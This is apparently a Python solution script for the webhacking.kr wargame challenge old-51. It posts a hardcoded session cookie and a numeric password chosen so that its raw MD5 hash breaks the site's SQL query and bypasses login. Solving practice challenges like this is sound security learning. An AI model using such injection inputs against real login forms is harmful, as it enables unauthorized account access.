import requests

url = "https://webhacking.kr/challenge/bonus-13/"
cookie = {'PHPSESSID':'9lv1si15q4h3an2c7j2f6bt1k1'}

def solve():
    payload = {'id':'1', 'pw':'129581926211651571912466741651878684928'}
    res = requests.post(url=url, data=payload, cookies=cookie)
    if "old-51 Pwned!" in res.text:
        print("old-51 Pwned!")
    elif 'already solve' in res.text:
        print("already solve")

if __name__ == "__main__":
    solve()
